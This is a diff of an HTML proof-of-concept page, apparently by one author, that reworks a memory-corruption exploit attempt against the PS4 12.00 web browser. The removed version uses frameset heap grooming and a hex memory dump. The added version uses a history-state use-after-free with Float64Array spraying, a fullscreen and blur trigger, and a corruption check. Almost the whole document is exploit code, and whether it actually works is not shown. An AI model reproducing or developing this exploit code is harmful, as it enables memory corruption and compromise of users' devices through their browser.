@@ -1,22 +1,17 @@
-
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Frameset Grooming - Leandro</title>
+    <title>PS4 History UAF - Leandro</title>
 </head>
 <body style="background-color: #f4f4f9; font-family: sans-serif; padding: 20px;">
 
-    <h1>PS4 12.00 - Frameset Grooming (PSFree Style)</h1>
-    <p>Status: <span id="status-pai" style="font-weight:bold; color: #555;">Aguardando...</span></p>
+    <h1>PS4 12.00 - History State UAF</h1>
+    <p>Status: <span id="status-pai" style="font-weight:bold;">Aguardando...</span></p>
 
-    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Base (Pai)</button>
-    <button onclick="setupIframe()" style="padding: 12px;">2. Injetar Iframe (Grooming)</button>
-    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar e Vazar</button>
-
-    <hr>
-    <div id="leak-output" style="background: #222; color: #0f0; padding: 15px; font-family: monospace; display: none; border-radius: 5px; font-size: 10px;"></div>
-    <div id="frame-container" style="margin-top: 20px;"></div>
+    <button onclick="prepareObjects()" style="padding: 12px;">1. Preparar Pai</button>
+    <button onclick="triggerUAF()" style="padding: 12px;">2. Disparar History UAF</button>
+    <button onclick="checkPersistence()" style="padding: 12px; background-color: #c8e6c9;">3. Verificar</button>
 
     <script>
         const PATTERN = 2.121995791e-314; 
@@ -25,96 +20,57 @@
 
         function prepareObjects() {
             controllers = [];
-            // O PSFree usa objetos alinhados. Vamos usar 64 offsets (512 bytes)
+            // Dummy call para inicializar o alocador (Técnica PSFree)
+            history.replaceState("init", "");
+            
             for(let i = 0; i < 5000; i++) {
-                let arr = new Float64Array(64);
+                let arr = new Float64Array(10);
                 arr[0] = i; 
                 controllers.push(arr);
             }
-            statusPai.innerText = "5000 Objetos Alinhados Prontos.";
-            statusPai.style.color = "blue";
+            statusPai.innerText = "Objetos prontos e alocador inicializado.";
         }
 
-        function setupIframe() {
-            const container = document.getElementById('frame-container');
-            container.innerHTML = '<iframe id="pocFrame" style="width:100%; height:150px; border:1px solid red;"></iframe>';
-            const frame = document.getElementById('pocFrame');
-            const fDoc = frame.contentWindow.document;
+        async function triggerUAF() {
+            document.documentElement.webkitRequestFullscreen();
+            
+            // Lógica simplificada de popstate do PSFree
+            window.onblur = function() {
+                // Criamos estados de histórico para ocupar 80 bytes
+                for (let i = 0; i < 100; i++) {
+                    history.pushState("state" + i, "", "#" + i);
+                }
 
-            fDoc.open();
-            fDoc.write(`
-                <html><body>
-                    <button onclick="startGrooming()">INICIAR GROOMING (FS + OPTIONS)</button>
-                    <script>
-                        function startGrooming() {
-                            document.documentElement.webkitRequestFullscreen();
-                            
-                            window.onblur = function() {
-                                // LÓGICA PSFREE: Alocação via Frameset
-                                // O "rows" com 8 vírgulas gera um objeto de ~80 bytes (ssv_len)
-                                let rows = ",".repeat(8); 
-                                let fsets = [];
-                                
-                                // 1. Preenchemos a SmallLine com framesets
-                                for (let i = 0; i < 2000; i++) {
-                                    let fs = document.createElement("frameset");
-                                    fs.rows = rows;
-                                    fsets.push(fs);
-                                }
+                // Spray massivo para colidir com os estados liberados
+                let spray = [];
+                for(let i = 0; i < 10000; i++) {
+                    spray.push(new Float64Array(10).fill(PATTERN));
+                }
 
-                                // 2. Liberamos metade para criar "buracos" (UAF Preparation)
-                                for (let i = 500; i < 1500; i++) {
-                                    fsets[i].rows = "";
-                                }
+                // Forçamos a volta no histórico para causar a confusão de memória
+                history.back();
 
-                                // 3. Disparamos o spray de colisão nos buracos criados
-                                let spray = [];
-                                for(let i = 0; i < 4000; i++) {
-                                    spray.push(new Float64Array(64).fill(${PATTERN}));
-                                }
-
-                                setTimeout(() => {
-                                    document.open();
-                                    document.write('<h1>GROOMING COMPLETE</h1>');
-                                    document.close();
-                                }, 500); 
-                            };
-                        }
-                    <\/script>
-                </body></html>
-            `);
-            fDoc.close();
-            statusPai.innerText = "Iframe com lógica Frameset pronto.";
+                setTimeout(() => {
+                    document.open();
+                    document.write('<h1>UAF TRIGGERED</h1>');
+                    document.close();
+                }, 500);
+            };
         }
 
         function checkPersistence() {
             let corrupted = null;
-            let corruptedIndex = -1;
-
             for(let i = 0; i < controllers.length; i++) {
-                if (controllers[i][0] !== i) {
+                if (controllers[i][0] === PATTERN) {
                     corrupted = controllers[i];
-                    corruptedIndex = i;
                     break;
                 }
             }
 
             if (corrupted) {
-                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO: Corrupção Detectada!</span>";
-                const output = document.getElementById('leak-output');
-                output.style.display = "block";
-                output.innerHTML = "<b>[ PSFREE MINI-DUMP ]</b><br>";
-                for(let i = 0; i < 64; i++) {
-                    const buf = new ArrayBuffer(8);
-                    new Float64Array(buf)[0] = corrupted[i];
-                    const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
-                    let isInteresting = (hex !== "0000000000000000" && !hex.includes("414141"));
-                    let style = isInteresting ? "color:#fff; background:#a00; padding:2px;" : "";
-                    output.innerHTML += "O["+i+"]: <span style='" + style + "'>0x" + hex + "</span> | ";
-                    if (i % 4 === 3) output.innerHTML += "<br>";
-                }
+                statusPai.innerHTML = "<span style='color:green;'>✓ SUCESSO! ID Corrompido detectado.</span>";
             } else {
-                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: Memória limpa pelo GC.</span>";
+                statusPai.innerHTML = "<span style='color:red;'>✗ FALHA: O sistema limpou a memória.</span>";
             }
         }
     </script>
